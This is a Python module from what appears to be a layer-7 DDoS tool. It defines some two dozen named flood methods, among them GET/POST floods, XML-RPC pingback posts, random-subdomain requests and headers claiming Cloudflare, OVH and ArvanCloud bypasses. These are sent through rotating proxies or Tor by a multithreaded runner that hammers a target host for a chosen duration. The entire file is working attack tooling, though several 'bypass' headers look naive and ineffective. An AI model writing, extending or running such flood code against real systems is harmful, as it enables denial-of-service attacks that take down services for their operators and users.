import requests
import threading
import time
import random
import string
from typing import List, Dict
from random import choice

# === Utils ===
def random_subdomain(domain: str) -> str:
    sub = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"http://{sub}.{domain}"

def random_cookie() -> str:
    return f"PHPSESSID={''.join(random.choices(string.ascii_letters + string.digits, k=26))}"

def get_proxy(proxies: Dict[str, List[str]]) -> Dict[str, str]:
    all_types = [ptype for ptype in proxies for _ in proxies[ptype]]
    all_values = sum(proxies.values(), [])

    if not all_values:
        return None

    index = choice(range(len(all_values)))
    ptype = all_types[index]
    ipport = all_values[index]
    proxy_url = f"{ptype}://{ipport}"

    print(f"[Proxy] Using {proxy_url}")
    return {"http": proxy_url, "https": proxy_url}

# === Layer 7 Attack Functions ===
def get_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, proxies=proxy, timeout=5)
    print(f"[GET] {url} → {r.status_code}")

def post_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.post(url, data={"flood": "true"}, proxies=proxy, timeout=5)
    print(f"[POST] {url} → {r.status_code}")

def ovh_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"X-Hex": hex(random.randint(0, 99999))}, proxies=proxy, timeout=5)
    print(f"[OVH] {url} → {r.status_code}")

def ovh_rhex_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={
        "User-Agent": ''.join(random.choices(string.hexdigits, k=32)),
        "X-HexFlood": ''.join(random.choices(string.hexdigits, k=64))
    }, proxies=proxy, timeout=5)
    print(f"[RHEX] {url} → {r.status_code}")

def ovh_stomp_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={
        "User-Agent": "Mozilla/5.0",
        "X-Captcha-Bypass": "true",
        "Referer": url,
        "Accept": "*/*"
    }, proxies=proxy, timeout=5)
    print(f"[STOMP] {url} → {r.status_code}")

def stress_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.post(url, data="A" * 2048, proxies=proxy, timeout=5)
    print(f"[STRESS] {url} → {r.status_code}")

def dyn_request(url, proxies):
    proxy = get_proxy(proxies)
    final_url = random_subdomain(url)
    r = requests.get(final_url, proxies=proxy, timeout=5)
    print(f"[DYN] {final_url} → {r.status_code}")

def downloader_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, proxies=proxy, stream=True, timeout=5)
    for chunk in r.iter_content(chunk_size=1):
        break
    print(f"[DOWNLOADER] {url} → {r.status_code}")

def slow_request(url, proxies):
    proxy = get_proxy(proxies)
    s = requests.Session()
    r = s.get(url, headers={"Connection": "keep-alive"}, proxies=proxy, timeout=5)
    print(f"[SLOW] {url} → {r.status_code}")

def head_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.head(url, proxies=proxy, timeout=5)
    print(f"[HEAD] {url} → {r.status_code}")

def null_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"User-Agent": ""}, proxies=proxy, timeout=5)
    print(f"[NULL] {url} → {r.status_code}")

def cookie_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"Cookie": random_cookie()}, proxies=proxy, timeout=5)
    print(f"[COOKIE] {url} → {r.status_code}")

def pps_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"Connection": "close"}, proxies=proxy, timeout=5)
    print(f"[PPS] {url} → {r.status_code}")

def even_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"X-Even": "1", "X-Special": "Yes"}, proxies=proxy, timeout=5)
    print(f"[EVEN] {url} → {r.status_code}")

def gsb_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"User-Agent": "Googlebot"}, proxies=proxy, timeout=5)
    print(f"[GSB] {url} → {r.status_code}")

def dgb_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"X-DDoS-Bypass": "1"}, proxies=proxy, timeout=5)
    print(f"[DGB] {url} → {r.status_code}")

def avb_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"X-ArvanCloud-Bypass": "1"}, proxies=proxy, timeout=5)
    print(f"[AVB] {url} → {r.status_code}")

def bot_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"}, proxies=proxy, timeout=5)
    print(f"[BOT] {url} → {r.status_code}")

def apache_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"Transfer-Encoding": "chunked"}, proxies=proxy, timeout=5)
    print(f"[APACHE] {url} → {r.status_code}")

def xmlrpc_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.post(url + "/xmlrpc.php", data="<methodCall><methodName>pingback.ping</methodName></methodCall>", headers={"Content-Type": "text/xml"}, proxies=proxy, timeout=5)
    print(f"[XMLRPC] {url} → {r.status_code}")

def cfb_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"CF-Bypass": "1"}, proxies=proxy, timeout=5)
    print(f"[CFB] {url} → {r.status_code}")

def cfbuam_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"User-Agent": "Mozilla/5.0", "Challenge": "Bypassed"}, proxies=proxy, timeout=5)
    print(f"[CFBUAM] {url} → {r.status_code}")

def bypass_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"Bypass": "1"}, proxies=proxy, timeout=5)
    print(f"[BYPASS] {url} → {r.status_code}")

def bomb_request(url, proxies):
    proxy = get_proxy(proxies)
    r = requests.get(url, headers={"User-Agent": "bombardier"}, proxies=proxy, timeout=5)
    print(f"[BOMB] {url} → {r.status_code}")

def killer_request(url, proxies):
    for _ in range(5):
        proxy = get_proxy(proxies)
        r = requests.get(url, proxies=proxy, timeout=2)
        print(f"[KILLER] {url} → {r.status_code}")

def tor_request(url, proxies):
    r = requests.get(url, proxies={
        "http": "socks5h://127.0.0.1:9050",
        "https": "socks5h://127.0.0.1:9050"
    }, timeout=5)
    print(f"[TOR] {url} → {r.status_code}")

# === Dispatcher ===
METHODS = {
    "GET": get_request,
    "POST": post_request,
    "OVH": ovh_request,
    "OVH:RHEX": ovh_rhex_request,
    "RHEX": ovh_rhex_request,
    "OVH-STOMP": ovh_stomp_request,
    "STOMP": ovh_stomp_request,
    "STRESS": stress_request,
    "DYN": dyn_request,
    "DOWNLOADER": downloader_request,
    "SLOW": slow_request,
    "HEAD": head_request,
    "NULL": null_request,
    "COOKIE": cookie_request,
    "PPS": pps_request,
    "EVEN": even_request,
    "GSB": gsb_request,
    "DGB": dgb_request,
    "AVB": avb_request,
    "BOT": bot_request,
    "APACHE": apache_request,
    "XMLRPC": xmlrpc_request,
    "CFB": cfb_request,
    "CFBUAM": cfbuam_request,
    "BYPASS": bypass_request,
    "BOMB": bomb_request,
    "KILLER": killer_request,
    "TOR": tor_request,
}

# === Runner ===
def run_layer7_attack(args, proxies: Dict[str, List[str]]):
    end_time = time.time() + args.duration
    url = f"http://{args.target}:{args.port}"
    method_key = args.method.upper().replace("-", ":").replace("_", ":")

    method_func = METHODS.get(method_key)
    if not method_func:
        print(f"[!] Invalid L7 method: {args.method}")
        return

    def attack():
        while time.time() < end_time:
            try:
                method_func(url, proxies)
            except Exception as e:
                print(f"[!] Error during attack: {e}")

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
